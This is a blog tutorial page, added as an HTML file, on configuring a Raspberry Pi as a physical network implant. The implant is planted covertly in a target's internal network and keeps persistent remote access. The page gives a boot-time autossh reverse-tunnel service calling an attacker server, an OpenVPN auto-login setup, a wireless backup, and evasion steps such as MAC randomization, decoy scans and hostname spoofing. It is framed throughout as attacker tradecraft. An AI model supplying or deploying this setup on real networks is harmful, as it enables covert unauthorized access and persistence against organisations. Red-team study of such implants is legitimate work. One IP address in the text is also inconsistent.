@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Physical Network Implants.</title>
+    <style>
+        body {
+            background-color: #222;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        p {
+            color: #00ff00;
+        }
+
+        .p-detail p {
+            color: #7f8c8d; 
+        }
+        .p-detail ul {
+            color: #7f8c8d; 
+        }
+
+        .image1 img {
+            border: 1.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 800px;
+            height: auto;
+        }
+
+        .image2 img {
+            border: 1.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 950px;
+            height: auto;
+        }
+
+        .image3 img {
+            border: 1.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 80%;
+            height: auto;
+        }
+
+        .image4 img {
+            border: 0.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 60%;
+            height: auto;
+        }
+
+        .image5 img {
+            border: 0.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 100%;
+            height: auto;
+        }
+
+        .image6 img {
+            border: 0.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 700px;
+            height: auto;
+        }
+        .image7 img {
+            border: 0.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 400px;
+            height: auto;
+        }
+        .image9 img {
+            border: 0.5px solid #00ff00;
+            border-radius: 4px;
+            padding: 5px;
+            width: 720px;
+            height: auto;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            align-items: flex-start;
+        }
+
+        .nav {
+            width: 50px;
+            background-color: #333;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .nav a {
+            display: block;
+            color: #00ff00;
+            text-decoration: none;
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+
+        .content {
+            padding: 20px;
+        }
+
+        .date-time {
+            color: #00ff00;
+            font-size: 20px;
+            margin-right: 20px;
+            margin-top: 20px;
+            flex: 1;
+            text-align: right;
+        }
+
+        /* Title box */
+        .title-box {
+            background-color: black;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .gray-text {
+            color: #7f8c8d; /* Calming gray color */
+        }
+
+        /* Terminal-style black box */
+        .terminal-box {
+            background-color: black;
+            color: #7f8c8d; /* Gray text color */
+            padding: 20px;
+            white-space: pre-line;
+            font-family: 'Hack', monospace; /* Use 'Hack' font */
+            font-size: 15px; /* Font size for terminal box text */
+            height: 200px; /* Fixed height for the terminal box */
+            overflow-y: auto; /* Add scroll if content exceeds height */
+            border-radius: 1%;
+            border: 0.5px solid #00ff00;
+        }
+
+        /* About page specific styles */
+        .about-title {
+            font-size: 27px;
+            font-weight: bolder;
+            color: #7f8c8d;
+            text-align: left;
+            margin-bottom: 10px; /* Add margin to separate from image */
+        }
+
+        .profile-image-container {
+            text-align: center;
+        }
+
+        .profile-image {
+            border-radius: 15%;
+            max-width: 200px; /* Adjust image size as needed */
+            display: inline-block;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav">
+            <a href="https://vrikodar.github.io/about.html">About</a>
+            <a href="https://vrikodar.github.io/index.html">Home</a>
+            <a href="https://vrikodar.github.io/explore.html">Explore</a>
+            <a href="https://vrikodar.github.io/projects.html">Projects</a>
+        </div>
+        <div class="content">
+            <div class="about-title">Physical Network Implants</div>
+            <br>
+            <p>What is a physical network implant? why would you need a physical network implant?</p>
+            <div class="p-detail">
+            <p>Physical network implant is a device which is plugged inside the target's network and is configured to call back to a server on internet and establish a stable reverse connection, A user would then generally access this device via the server it connected back to on the internet and access the internal network in which the device is planted.<br><br>These implants can be used to maintain persistence internal network access and can be utilized based on the use case.</p>
+           </div><p>Few Important things to note before we get into configuring physical network implants:</p><div class="p-detail"><p>1.) Device of choice which is going to be utilized for the physical implant.<br>2.) Raspberry Pi Zero due to its small size and compact appearence is a perfect choice for physical implant where you don't want it to be easily spotted by anyone.<br>3.) This article will discuss about configuring network implants mainly on Linux.<br>4.) Configuration for windows will also be discussed but its not very reliable and stable.<br>5.) The implant can be configured to establish tunnels back using two ways OpenVPN tunnel and Reverse SSH tunnel.<br>6.) The OpenVPN and SSH tunnels can be run at the same time on the implants to have two reverse tunnels at same time.<br>7.) When Either of them is down the other can act as a backup tunnel.<br></p></div>
+           <p>Some steps to make the implant less detectable on the network (will discussed in detail in another article):</p>
+            <div class="p-detail">
+            <p>1.) MAC address randomization can be configured on the implant.<br>
+            2.) A script can be configured to run in background that sends port scanning packets randomly on the subnet with spoofed or decoy IPs.<br>
+            3.) Spoof the Hostname of the machine to one of the devices present already in the network or set it to a generic hostname.<br>
+            </div>
+            <p>Diagram for Implant Inside an internal network using SSH tunnels:</p>
+            <div class="image1"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/phy.png"></div>
+            <div class="p-detail">
+            <p>1.) The Implant first establishes a tunnel back to a SERVER (controlled by the attacker) on the internet its configured to connect back to.<br>2.) The attacker can then connect to this server.<br>3.) The implant device can then be accessed via the SERVER (this will be discussed in detail later), which will now be acting as a JUMPBOX.</p>
+            </div>
+            <p>Configuring SERVER and the IMPLANT:</p>
+            <div class="p-detail">
+            <p><b>SSH SERVER CONFIGURATION:</b></p>
+            <p>1.) The implant machine is going to connect back to the server and basically get a command shell as well.<br>
+            2.) For security of the server best practice is to create a new user on the server and configure the implant to connection back to server with this user.<br>
+            3.) For example we can create a new user named tunneluser on the SERVER machine.<br>
+            4.) Following command can be used to do so: <b>"adduser tunneluser"</b>.<br>
+            5.) Next Step is to change the SSH port of server from 22 to 443<br>
+            6.) This will ensure that the outgoing SSH tunnel connections from implant are not blocked by firewall.<br>
+            7.) To change the port you can edit the configuration file <b>"/etc/ssh/sshd_config"</b><br>
+            8.) Edit or add the following line to the  <b>sshd_config</b> file:<b> Port 443</b><br>
+            9.) If possible it is always good to have DNS name assigned to SSH SERVER machine.</b><br>
+            <p><b>IMPLANT CONFIGURATION:</b></p>
+            <p>1.) The implant can now be configured for SSH tunnels.<br>
+            2.) we are going to utlize <b>autossh</b> for our automatic SSH tunneling configuration,.<br>
+            3.) We will create a service on the system which triggers execution of the autossh program automatically on boot.<br>
+            4.) You can choose a custom name for service, here we are naming it <b>tunnel.service</b> and we will save it to <b>"/etc/systemd/system/tunnel.service"</b>.<br>
+            5.) The simplest configuration for this service is given below<br>
+            </div>
+            <div class="terminal-box" id="terminal">
+                <span class="gray-text">
+                    [Unit]
+                    Description=SSH tunnel
+                    After=network.target
+
+                    [Service]
+                    User=root
+                    Environment="AUTOSSH_PORT=0"
+                    Environment="AUTOSSH_GATETIME=0"
+                    RestartSec=3
+                    Restart=always
+
+                    ExecStart=/usr/bin/autossh -M 0 -N -q -o "ServerAliveInterval 60" -o "ServerAliveCountMax 3" -p 443 -l tunneluser [SERVER-IP-SERVER-DOMAIN] -R 127.0.0.1:2222:127.0.0.1:22
+
+                    [Install]
+                    WantedBy=multi-user.target
+                </span>
+            </div>
+            <div class="p-detail">
+                <p>6.) The ExecStart Parameter contains the main command to create the reverse tunnel<br>
+                7.) Port 2222 will be binded to localhost on the target SERVER machine and all traffic will be redirected to 22 on IMPLANT machine via the reverse tunnel<br>
+                8.) You can choose to use a different port than 2222, just make sure its not already being used by any other program.<br>
+                9.) Manually a test SSH connection can be made on the IMPLANT machine just to add the host to known_hosts list and ensure smooth working of this direct command later (since we are not using options to skip this automatically in the ExecStart Command).<br>
+                10.) Next we need to enable this service using following command: <b>"systemctl enable tunnel.service"</b><br>
+                11.) This service will run automatically on system boot everytime.
+            </div>
+            <div class="p-detail">
+            <p><b>SSH KEY CONFIGURATIONS:</b></p>
+            <p>1.) We will configure key based ssh authentication between IMPLANT and SERVER.<br>
+            2.) If not already present on the IMPLANT machine, as <b>"root"</b> user we will generate ssh key pairs with command: <b>"ssh-keygen"</b><br>
+            3.) we will copy contents of the <b>"id_rsa.pub"</b> which is the public key.<br>
+            4.) On the SERVER machine we will switch to <b>tunnel</b> user and then repeat the process of generating the ssh key pair with command: <b>"ssh-keygen"</b><br>
+            5.) On SERVER machine We will then save the previously copied public key from IMPLANT machine to <b>"/home/tunneluser/.ssh/authorized_keys"</b><br>
+            6.) Make sure to save it on new line if you already have other key(s) added to file. example command: <b>"echo 'key_value' >> /home/tunneluser/.ssh/authorized_keys"</b><br>
+            7.) At last we will disable password based authentication on the SSH SERVER<br>
+            8.) Make sure that you have added public key of your host system to authorized_keys in respective users directory on the SERVER machine so that you don't loose access to SSH if its currently password based.<br>
+            9.) In the file <b>"/etc/ssh/sshd_config"</b> we add following line <b>"PasswordAuthentication no"</b><br>
+        </p></div>
+            <div class="p-detail">
+            <p><b>FINAL TEST:</b></p>
+            <p>1.) Once everything is setup as a test we can start the service with: <b>"systemctl start tunnel.service"</b>.<br>
+            2.) Now on the SERVER machine a reverse tunnel should be created.<br>
+        </p></div>
+        <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/reverse_tunnel.png"></div>
+            <div class="p-detail">
+            <p>3.) Now you can get a ssh session on the IMPLANT machine with: <b>"ssh -p 2222 user@127.0.0.1"</b><br>
+                4.) Since the IMPLANT machine is connected to an internal network, we effectively have access to that internal network using the IMPLANT machine remotely 
+        </p></div>
+            <p>OpenVPN Setup Configuration:</p>
+            <div class="p-detail">
+            <p>1.) Now we will look at another method of configuring the physical network implant for reverse connections.<br>
+            2.) Instead of using reverse SSH tunnels, this setup will use OPENVPN tunnels.<br>
+            3.) Note that the setup will be similar to VPN split tunneling and internet traffic would not be routed through the VPN tunnel.<br>
+            4.) Only subnet specific traffic will be routed through the VPN, this will allow us to also simuntaneously run the SSH tunnel.<br>
+            5.) We can configure the VPN to route internet traffic but then doing this during the implant being used at same time might cause issues and we might loose access to the implant once its planted inside the network.<br>
+            6.) Unless you don't plan on using both SSH tunnel and OpenVPN tunnel at same time (having both will ensure backup access), you can enable routing IMPLANT internet traffic through VPN.<br>
+            7.) Below is diagram for implant inside internal network using OpenVPN ssh tunnel.</p>
+            </div>
+            <div class="image2"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/vpntunnel.png"></div>
+            <div class="p-detail">
+                <p>Both the attacker machine and the IMPLANT machine are connected to VPN server and in same VPN network hence they are now able to communicate with each other.<br><br>
+                <b>CONFIGURING THE OPENVPN SERVER:</b><br>
+                1.) We need a linux machine on the internet to start with.<br>
+                2.) we use a simple debian machine here, this can easily be deployed on Azure or AWS<br>
+                3.) We will install the OpenVPN access server on this machine.<br>
+                4.) An account is required to use OpenVPN access server and the free license allows only 2 simuntaneous VPN connections, which should be sufficent in our case.<br>
+                5.) Once you create the account and login (<a href="https://as-portal.openvpn.com/instructions/debian/installation">https://as-portal.openvpn.com/instructions/debian/installation</a>), you should see install instructions in <b>"Quick Start"</b><br>
+                6.) The commands to install OpenVPN access server on a Debian machine via the OpenVPN repository are given below:
+            </p>
+            </div>
+            <div class="terminal-box" id="terminal">
+                <span class="gray-text">
+                    # execute these commands as root user on the deployed Debian Machine
+
+                    apt update && apt -y install ca-certificates wget net-tools gnupg
+
+                    wget https://as-repository.openvpn.net/as-repo-public.asc -qO /etc/apt/trusted.gpg.d/as-repository.asc
+
+                    echo "deb [arch=amd64 signed-by=/etc/apt/trusted.gpg.d/as-repository.asc] http://as-repository.openvpn.net/as/debian bookworm main">/etc/apt/sources.list.d/openvpn-as-repo.list
+
+                    apt update && apt -y install openvpn-as
+                </span>
+            </div>
+            <div class="p-detail">
+                <p>7.) If you get errors with repository install then try installing manually by downloading the debian packages.<br>
+                8.) If errors persist try doing the install on different OS may be ubuntu this time.<br>
+                9.) After the install the OpenVPN access server will automatically run and the Web UI will also be started with temporary credentials as shown below
+            </p>
+            </div>
+            <div class="image4"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/install.png"></div>
+            <div class="p-detail">
+                <p>
+                10.) We can do a local ssh forward to access the port 943 on the VPN Server on our machine.<br>
+                11.) Simple command to do so is following: <b>"ssh -i key.pem -L 127.0.0.1:943:127.0.0.1:943 user@[VPN-SERVER-IP]"</b>.<br>
+                12.) Now we will be able to access the web GUI from our machine at <b>"https://127.0.0.1:943"</b>.<br>
+                13.) When you access the admin WebGUI for first time it will ask for the activation key, you can get these from the openvpn AS portal where you signed up earlier. <b>It is also very important that you go to Configuration --> Network Settings and then change the Hostname or IP Address value to the Public IP address or Public Domain (if assigned) of the deployed VM machine on which access server is installed.</b></p>
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/activate_vpn.png"></div>
+            <div class="p-detail">
+                <p>
+                14.) Remember to change the Hostname or Public IP to public IP of VM under network settings<br>
+                15.) Next we will restrict the web GUI running on port 943 to IP of our choice, this is to protect the login web portal from unauthorized access (depending on azure or aws or local deployment) (there are options to restrict to localhost and seprate admin and client GUI but we don't discuss them in current article)<br>
+                16.) Next we will change the temporary login password for the user <b>"openvpn"</b> to a more strong password.<br>
+                17.) The openvpn login user password can be changed in <b>User Management --> User Permissions --> openvpn --> More settings (click edit pencil logo)</b><br>
+            </p>
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/change_pass.png"></div>
+            <div class="p-detail">
+                <p>
+                18.) Now we need to change some settings for VPN itself.<br>
+                29.) We will disable routing internet traffic through the VPN by disabling this option in <b>"VPN settings"</b>.<br>
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/internet_no.png"></div>
+                <div class="p-detail">
+                <p>
+                20.) Now we need to change some settings for VPN itself.<br>
+                21.) First we will disable routing internet traffic through the VPN by disabling this option in <b>"VPN settings"</b>.<br>
+                22.) Make sure to scroll to bottom and Click on <b>"Save Settings"</b> and also then click on option <b>"Update Running Server"</b> that appears on top after saving settings<br>
+                23.) Then we will enable <b><i>inter client communication under</i></b> <b> "Advanced VPN"</b>.<br>
+                24.) This will basically allow our attacker machine and the implant machine to communicate with each other once both are connected to VPN at same time.</p> 
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/interclient_vpn.png"></div>
+                <div class="p-detail">
+                <p><b>CREATING CLIENT USERS:</b><br><br>
+                1.) Now we will create client users which are going to connect to the VPN<br>
+                2.) we will again go to <b>"User Management --> User Permissions"</b> and add two new users <b>vpncl1</b>, <b>vpncl2</b><br>
+                3.) We also need to Click on <b>Allow Auto-Login</b> when configuring user permissions.
+                4.) Make sure to scroll to bottom and Click on <b>"Save Settings"</b> and also then click on option <b>"Update Running Server"</b> that appears on top after saving settings<br>
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/usersadded.png"></div>
+            <div class="p-detail">
+                <p>
+                5.) Once the users are added with auto login enabled, their configuration files can be downloaded.<br>
+                6.) we will  go to <b>"User Management --> User Profiles --> Select User --> New Profile --> Create Profile"</b> the profiles will be downloaded and can be renamed with the respective username in front.<br>
+                7.) Make sure to select the <b>AutoLogin</b> option, by default when creating a profile its set to user locked but we need <b>AutoLogin</b> to be enabled.<br> 
+            </p>
+            </div>
+           <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/createprofile.png"></div>
+            <div class="p-detail">
+                <p>
+                8.) These ovpn files will now be ready to be used with IMPLANT.<br>
+                9.) <b>At Last on the OpenVPN ACCESS SERVER Make sure the port 1194 is allowed for incoming connections (Azure or AWS firewall rules for machine)</b>
+            </p>
+            </div>
+            <div class="p-detail">
+                <p><b>CONFIGURING OPENVPN CLIENT ON IMPLANT MACHINE:</b><br><br>
+                1.) You can choose to use anyone of the two client configurations (profiles) which were created earlier.<br>
+                2.) We are going to configure the openvpn client on rasberry pi which will take the configuration profile we created earlier and connect to VPN everytime on boot.<br>
+                3.) First transfer the configuration profile to the IMPLANT machine.<br>
+                4.) Make sure openvpn client is installed on the client machine: <b>"apt install openvpn"</b><br>
+                5.) Then copy the contents of file <b>vpncl1.conf</b> (file in which we saved user profile for vpncl1, we have renamed it.) to <b>/etc/openvpn/client.conf</b><br>
+                6.) Once this is done we will enable the OpenVPN service first with: <b>"systemctl enable openvpn.service"</b><br>
+                7.) Next we will start the service with: <b>"systemctl start openvpn.service"</b><br>
+                8.) Note that we have enabled autologin in user permissions and also when generating the profile, this allows connecting directly with the .ovpn files without specifying any extra credentials.<br>
+                9.) If everything went correctly we will see the IMPLANT machine connected under <b>"Status --> Current Users"</b><br>
+            </div>
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/status_connected.png"></div>
+            <div class="p-detail">
+                <p><b>CONNECTING THE SECOND CLIENT (The Attacker Machine):</b><br><br>
+                1.) Connecting would differ based on the host operationg system in use.<br>
+                2.) From linux machine the VPN connection can be made simply by executing: <b>"openvpn vpncl2.ovpn".</b><br>
+                3.) However this command needs to be run everytime a connection is needed, for automatic process the steps stated in previous section for implant can be replicated with vpncl2.ovpn file.<br>
+                4.) To connect from windows machine the OpenVPN community clien needs to be downloaded: <a href="https://openvpn.net/downloads/openvpn-connect-v3-windows.msi">Download OpenVPN Connect v3 widnows</a><br>
+                5.) Once downloaded and installed, run the connect client.<br>
+                6.) Select the Upload File option from the GUI and upload the vpncl2.ovpn file here.<br>
+            </div>
+             <div class="image6"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/upload.png"></div>
+             <div class="p-detail">
+                <p>
+                7.) Once the file is imported the connection can be made by clicking on connect.<br>
+                8.) Now both the machines, the implant as well as the attacker will be connected to the VPN.<br>
+            </div>
+             <div class="image7"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/connectedcl2.png"></div>
+             <div class="p-detail">
+                <p>
+                9.) We can check the status again from the VPN portal and this time both vpncl1, vpncl2 will showup as connected at same time.</p>
+            </div>    
+            <div class="image3"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/connected_both.png"></div>
+             <div class="p-detail">
+                <p>
+                10.) We can see the internal VPN IP of IMPLANT machine (vpncl1) as 172.32.232.3 and that of the Attacker machine is 172.27.236.2.<br>
+                11.) From the attacker machine we will try to ping test the IMPLANT machine with command: <b>"ping 172.32.232.3"</b>
+            </p>
+            </div> 
+            <div class="image9"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/ping.png"></div>
+            <div class="p-detail">
+                <p>
+                12.) The pings work which means the devices are able to reach each other via the VPN tunnel and now we can SSH to the implant machine with command: <b>"ssh user@172.27.232.3"</b>.<br>
+                13.) Since the IMPLANT machine is connected to an internal network, we effectively have access to that internal network using the IMPLANT machine remotely.
+            </p></div>
+            <p>Wireless Endpoint Access: The Ultimate Backup if Both SSH Tunneling and OpenVPN tunneling FAIL!!!!:</p> 
+            <div class="p-detail">
+                <p>
+                1.) Although it is very less likely but if both the SSH tunneling and OpenVPN tunneling fail, then we need to have a backup access.<br>
+                2.) Why would the SSH tunnel or OpenVPN tunnel fail?<br>
+                3.) In first case, If the network has access control over port in which the IMPLANT is plugged, it will not have internet access which would mean no reverse tunnels, in this case nothing can be done.<br> 
+                4.) In the second case, if the network has super strict filtering that somehow blocks outgoing SSH tunnel and OpenVPN tunnel but the device is assigned an internal IP address and is able to access internet, a wireless access method can be configured on the implant.<br>
+                5.) In this case we will have to plant a router to a power source along with the implant that can host a wireless access point in the same vicinity.<br>
+                6.) Or we can configure the implant itself to host a wireless access point (we will see this in another article)<br>
+                7.) For now we will assume that using a router (or by any other means) a wireless AP is hosted in a close proximity of the implant<br>
+                8.) Lets assume that the wireless AP has <b>SSID: AP91</b> and <b>password: "password1234"</b><br>
+                9.) There is a drawback with this method, under normal circumstances the attacker also needs to be in close promixity of the wireless AP to connect to it and then reach the IMPLANT via the local LAN of wireless AP.<br>
+                10.) This can be overcomed by having a Parabolic antenna on the attacker side to reach the wireless access point from long distances.<br>
+                11.) These methods however might not be that stable.<br>
+                12.) The diagram below is for IMPLANT using wireless access.
+            </p></div>
+               <div class="image2"><img src="https://raw.githubusercontent.com/vrikodar/vrikodar.github.io/main/explore/phynetimplant/images/wireless_ultimate.png"></div>
+            <div class="p-detail">
+                <p>
+                13.) When both the IMPLANT and attacker machine are connected to same AP, both will be in same LAN.<br>
+                13.) Hence both the machines will be able to communicate with each other via the wireless interface.<br>
+                14.) To connect to the wireless point automatically we will use wpa supplicant on the IMPLANT machine.<br>
+                15.) WPA supplicant can be installed on the IMPLANT (raspberry pi in current case) machine using command: <b>"apt install wpasupplicant"</b><br>
+                16.) The configuration file needs to created at following location: <b>"/etc/wpa_supplicant/wpa_supplicant.conf"</b><br>
+                17.) Below is simplest configuration for our wireless access point AP91<br>
+            </p></div>
+            <div class="terminal-box" id="terminal">
+                <span class="gray-text">
+                    network={
+                     scan_ssid=1
+                     ssid="AP91"
+                     psk="password1234"
+                    }
+                </span>
+            </div>
+             <div class="p-detail">
+                <p>
+                18.) The SSID and psk can be changed according to the wireless AP configuration<br>
+                19.) The implant will try to connect to the AP91 wireless network everytime on boot.<br>
+                20.) At the same time attacker can connect to this wireless AP and connect to IMPLANT machine via SSH.<br>
+            </p></div>
+            <p>The Ending TRIO:</p> 
+             <div class="p-detail">
+                <p>
+                1.) On ending note the best settings would be to have all the three things running at same time.<br>
+                2.) Running OpenVPN tunnel (without internet traffic routing) with SSH tunnel and the wireless backup as at same time will ensure stable access to the implant machine in any way possible.<br>
+            </p></div>
+            <center><p><b>© 2024 <a href="https://github.com/vrikodar">Vrikodar</a></b></p></center>
+</body>
+</html>
